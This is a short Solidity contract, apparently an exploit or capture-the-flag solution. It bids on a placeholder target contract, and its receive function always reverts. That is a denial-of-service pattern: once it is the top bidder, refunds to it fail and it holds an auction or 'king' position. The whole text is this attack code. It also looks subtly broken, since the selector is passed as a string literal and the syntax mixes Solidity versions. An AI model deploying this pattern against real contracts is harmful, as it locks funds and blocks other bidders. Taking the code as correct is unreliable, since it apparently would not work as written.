contract BlockBids {
    function callBid() payable {
        
        address(<yourContract>).call{value: msg.value}('0x1998aeef');
    }

    receive () external payable {
        revert();
    }
}
